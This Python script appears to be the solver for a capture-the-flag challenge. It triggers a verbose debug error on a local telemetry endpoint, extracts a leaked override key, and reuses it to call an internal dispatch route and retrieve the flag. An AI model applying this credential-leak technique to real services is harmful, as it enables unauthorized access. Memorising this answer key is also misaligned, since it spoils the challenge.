#!/usr/bin/env python3
"""
Automated Participant-Side Solver for 28-production-debug-mode
Elicits verbose production debug disclosure from the telemetry query endpoint on port 8088,
recovers the internal executive core credentials, and dispatches an authorized command to retrieve the flag.
"""

import sys
import re
import json
import argparse
import urllib.request
import urllib.error

def solve(base_url="http://127.0.0.1:8088"):
    base_url = base_url.rstrip("/")
    print("=" * 65)
    print(" [*] 28-production-debug-mode Automated Solver")
    print(f" [*] Target Base URL: {base_url}")
    print("=" * 65)

    # Step 1: Health / Status Check
    print("\n[Step 1] Querying public gateway status...")
    status_url = f"{base_url}/api/v1/status"
    req = urllib.request.Request(status_url)
    with urllib.request.urlopen(req, timeout=10) as resp:
        status_data = json.loads(resp.read().decode())
    print(f"[+] Gateway Status: {status_data.get('status')} | Version: {status_data.get('gateway_version')}")

    # Step 2: Trigger Safe Error State to Elicit Debug Report
    print("\n[Step 2] Sending malformed telemetry query to elicit debug disclosure...")
    query_url = f"{base_url}/api/v1/telemetry/query"
    malformed_payload = json.dumps({
        "sector": 1337,
        "metrics": "invalid_type",
        "filter": "malformed_syntax"
    }).encode("utf-8")

    err_req = urllib.request.Request(
        query_url,
        data=malformed_payload,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        method="POST"
    )

    debug_data = None
    try:
        with urllib.request.urlopen(err_req, timeout=10) as resp:
            debug_data = json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        err_body = e.read().decode()
        try:
            debug_data = json.loads(err_body)
        except Exception:
            print(f"[-] Non-JSON response received: {err_body}")
            sys.exit(1)

    if not debug_data or "debug_report" not in debug_data:
        print(f"[-] Failed to receive debug disclosure: {debug_data}")
        sys.exit(1)

    print("[+] Debug disclosure received successfully!")
    runtime_env = debug_data["debug_report"].get("runtime_environment", {})
    debug_key = runtime_env.get("DEBUG_OVERRIDE_KEY")
    exec_route = runtime_env.get("INTERNAL_EXECUTIVE_ROUTE", "/api/v2/nexus/executive/control")
    action = runtime_env.get("REQUIRED_ACTION_PAYLOAD", "query_executive_core")
    target_node = runtime_env.get("TARGET_CORE_NODE", "sentinel_core_01")
    dispatch_gateway = runtime_env.get("INTERNAL_DISPATCH_GATEWAY", "/api/v1/gateway/dispatch")

    print(f"[+] Recovered DEBUG_OVERRIDE_KEY: {debug_key}")
    print(f"[+] Target Executive Route:       {exec_route}")
    print(f"[+] Required Action:              {action}")
    print(f"[+] Target Node:                  {target_node}")

    if not debug_key:
        print("[-] Debug override key not found in disclosure!")
        sys.exit(1)

    # Step 3: Dispatch Authorized Internal Command
    print(f"\n[Step 3] Dispatching authorized command via {base_url}{dispatch_gateway}...")
    dispatch_url = f"{base_url}{dispatch_gateway}"
    dispatch_payload = json.dumps({
        "endpoint": exec_route,
        "action": action,
        "target": target_node
    }).encode("utf-8")

    dispatch_req = urllib.request.Request(
        dispatch_url,
        data=dispatch_payload,
        headers={
            "Content-Type": "application/json",
            "X-Latveria-Debug-Token": debug_key
        },
        method="POST"
    )

    with urllib.request.urlopen(dispatch_req, timeout=10) as resp:
        resp_data = json.loads(resp.read().decode())
        print(f"[+] Dispatch Response ({resp.status}):\n{json.dumps(resp_data, indent=2)}")

    flag = resp_data.get("flag", "")
    flag_match = re.search(r"(YUVA\{[^\}]+\}|DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", flag)
    if not flag_match:
        print("[-] Flag not found in dispatch response!")
        sys.exit(1)

    extracted_flag = flag_match.group(1)
    print("\n" + "=" * 65)
    print(f"[SUCCESS] Flag Retrieved: {extracted_flag}")
    print("=" * 65 + "\n")
    return extracted_flag

def main():
    parser = argparse.ArgumentParser(description="28-production-debug-mode Solver")
    parser.add_argument("--url", default="http://127.0.0.1:8088", help="Target URL (default: http://127.0.0.1:8088)")
    args = parser.parse_args()
    solve(args.url)

if __name__ == "__main__":
    main()
